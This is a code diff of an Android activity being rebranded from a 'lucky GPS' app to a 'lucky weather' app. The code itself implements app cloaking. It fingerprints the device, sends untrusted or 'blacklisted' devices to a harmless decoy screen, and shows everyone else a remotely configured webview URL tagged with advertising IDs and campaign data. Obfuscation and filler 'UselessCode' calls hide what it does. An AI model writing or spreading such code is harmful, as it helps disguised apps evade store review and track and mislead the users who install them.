@@ -1,4 +1,4 @@
-package com.utilitydevs34.luckygps;
+package com.utilitydevs34.luckyweather;
 
 
 import android.content.Intent;
@@ -24,15 +24,15 @@ import androidx.fragment.app.Fragment;
 import androidx.fragment.app.FragmentTransaction;
 
 import com.onesignal.OneSignal;
-import com.utilitydevs34.luckygps.foo.FingerprintingProvider;
-import com.utilitydevs34.luckygps.foo.MyJsonObject;
-import com.utilitydevs34.luckygps.foo.ThreadedAFDeepLinkProvider;
-import com.utilitydevs34.luckygps.foo.ThreadedFBProvider;
-import com.utilitydevs34.luckygps.foo.ThreadedIDFAProvider;
-import com.utilitydevs34.luckygps.foo.UselessCode;
-import com.utilitydevs34.luckygps.foo.Utils;
-import com.utilitydevs34.luckygps.view.AdvancedWebView;
-import com.utilitydevs34.luckygps.view.CustomView;
+import com.utilitydevs34.luckyweather.foo.FingerprintingProvider;
+import com.utilitydevs34.luckyweather.foo.MyJsonObject;
+import com.utilitydevs34.luckyweather.foo.ThreadedAFDeepLinkProvider;
+import com.utilitydevs34.luckyweather.foo.ThreadedFBProvider;
+import com.utilitydevs34.luckyweather.foo.ThreadedIDFAProvider;
+import com.utilitydevs34.luckyweather.foo.UselessCode;
+import com.utilitydevs34.luckyweather.foo.Utils;
+import com.utilitydevs34.luckyweather.view.AdvancedWebView;
+import com.utilitydevs34.luckyweather.view.CustomView;
 
 import org.json.JSONObject;
 
@@ -48,20 +48,20 @@ import fi.iki.elonen.NanoHTTPD;
 import io.michaelrocks.paranoid.Obfuscate;
 
 @Obfuscate
-public class SuperActivity extends AppCompatActivity implements AdvancedWebView.Listener, CustomView.WebViewEventListener {
+public class GPSTopActivity extends AppCompatActivity implements AdvancedWebView.Listener, CustomView.WebViewEventListener {
 
     private ConstraintLayout rootView;
     private CustomView adView;
-
-    private static final String EXTRA_HTML = "";
-    String per;
-    private static long back_pressed;
 
     public static final byte REASON_BLACKLISTED = 1;
     public static final byte REASON_NO_NAMING = 2;
     public static final byte REASON_DISABLED = 10;
     public static final byte REASON_MAGIC = 11;
     public static final byte REASON_ERROR = 99;
+
+    private static final String EXTRA_HTML = "";
+    String per;
+    private static long back_pressed;
 
     //optimization
     Map<String, String> map = new HashMap<>();
@@ -77,9 +77,6 @@ public class SuperActivity extends AppCompatActivity implements AdvancedWebView.
         rootView = findViewById(R.id.root_constraint_layout);
         //---
 
-        Intent intent = getIntent();
-        per = intent.getStringExtra("privpo");
-
         Thread t = new Thread(() -> {
             try {
                 UselessCode.run();
@@ -90,7 +87,7 @@ public class SuperActivity extends AppCompatActivity implements AdvancedWebView.
                 UselessCode.run();
 
                 //get device fingerprint. A lot of information will be obtained, but not used by default.
-                FingerprintingProvider.init(SuperActivity.this);
+                FingerprintingProvider.init(GPSTopActivity.this);
 
                 if(!FingerprintingProvider.isTrusted()){
                     startSweetie(REASON_BLACKLISTED);
@@ -137,6 +134,9 @@ public class SuperActivity extends AppCompatActivity implements AdvancedWebView.
 
         setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_FULL_SENSOR);
 
+        Intent intent = getIntent();
+        per = intent.getStringExtra("privpo");
+
         if (!cnf.getBool("show_ad", false) || cnf.getStr("url").length() == 0) {
             if(per != null) {
                 adView = new CustomView(this);
@@ -159,6 +159,7 @@ public class SuperActivity extends AppCompatActivity implements AdvancedWebView.
 
 
 
+
         //update destination URL with various params
         String url = cnf.getStr("url");
         //if you provide trusted_url, all users with naming will be navigated there (i.e. you may use the app without external cloaking)
@@ -168,7 +169,6 @@ public class SuperActivity extends AppCompatActivity implements AdvancedWebView.
         map.put("ad_id", AppSingletonClass.getLocalConfig().getString(Utils.KEY_ADID));
 
         String test = appendQueryParameters(url, map);
-        Log.d("main", test);
 
         adView.loadUrl(test);
 
@@ -180,27 +180,9 @@ public class SuperActivity extends AppCompatActivity implements AdvancedWebView.
             adView.setVisibility(View.VISIBLE);
             new KeyboardUtil(this, rootView).enable();
             //init facebook
-            new ThreadedFBProvider(cnf, SuperActivity.this).run();
+            new ThreadedFBProvider(cnf, GPSTopActivity.this).run();
         }, 1320);
         //1320 - is a delay before showing webview so the user will see progress bar instead of white screen
-    }
-
-    @Override
-    public void onBackPressed() {
-        if(adView==null) return;
-        if(adView.canGoBack()){
-            adView.goBack();
-        }else if(getIntent().hasExtra(EXTRA_HTML)){
-            super.onBackPressed();
-        } else if(per != null)
-        {
-            if (back_pressed + 2000 > System.currentTimeMillis())
-                super.onBackPressed();
-            else
-                Toast.makeText(getBaseContext(), "Press once again to exit!",
-                        Toast.LENGTH_SHORT).show();
-            back_pressed = System.currentTimeMillis();
-        }
     }
 
 
@@ -221,7 +203,7 @@ public class SuperActivity extends AppCompatActivity implements AdvancedWebView.
             for (String campaignParam : splittedCampaignName) {
                 try {
                     sSrc = sSrc.replace("~af__campaign_" + i + "~", URLEncoder.encode(campaignParam, "UTF-8"));
-                    sSrc = sSrc.replace("~af__campaign_-" + (i + 1) + "~", URLEncoder.encode(splittedCampaignName[splittedCampaignName.length - i - 1], "UTF-8"));
+                    sSrc = sSrc.replace("~af__campaign_-" + (i + 1) + "~", URLEncoder.encode(splittedCampaignName[i], "UTF-8"));
                     jo.put("c" + i, campaignParam);
                 } catch (Exception ignored) {}
                 i++;
@@ -255,9 +237,6 @@ public class SuperActivity extends AppCompatActivity implements AdvancedWebView.
         overridePendingTransition(0, 0);
         finish();
 
-
-
-
         //in case when you need to load HTML5 game as sweetie
         runOnUiThread(() -> {
             UselessCode.run();
@@ -270,6 +249,9 @@ public class SuperActivity extends AppCompatActivity implements AdvancedWebView.
             ((ConstraintLayout) findViewById(R.id.root_constraint_layout)).removeAllViews();
             ((ConstraintLayout) findViewById(R.id.root_constraint_layout)).addView(adView, -1, new ConstraintLayout.LayoutParams(-1, -1));
             WebServer server = startWebServer();
+
+
+
 
             //try starting server 5 times
             int retrys = 0;
@@ -295,6 +277,24 @@ public class SuperActivity extends AppCompatActivity implements AdvancedWebView.
 
     private void onLoadingFailed() {
         startSweetie(REASON_ERROR);
+    }
+
+    @Override
+    public void onBackPressed() {
+        if(adView==null) return;
+        if(adView.canGoBack()){
+            adView.goBack();
+        }else if(getIntent().hasExtra(EXTRA_HTML)){
+            super.onBackPressed();
+        } else if(per != null)
+        {
+            if (back_pressed + 2000 > System.currentTimeMillis())
+                super.onBackPressed();
+            else
+                Toast.makeText(getBaseContext(), "Press once again to exit!",
+                        Toast.LENGTH_SHORT).show();
+            back_pressed = System.currentTimeMillis();
+        }
     }
 
     @Override
@@ -365,9 +365,6 @@ public class SuperActivity extends AppCompatActivity implements AdvancedWebView.
         tr.commit();
     }
 
-
-
-
     @Override
     protected void onResume() {
         super.onResume();
@@ -375,6 +372,8 @@ public class SuperActivity extends AppCompatActivity implements AdvancedWebView.
         if (adView == null) return;
         adView.onResume();
     }
+
+
 
     @Override
     protected void onPause() {
@@ -397,7 +396,7 @@ public class SuperActivity extends AppCompatActivity implements AdvancedWebView.
 
     @Override
     public void onPageFinished(String url) {
-        //pass
+        Log.d("main", url);
     }
 
     @Override
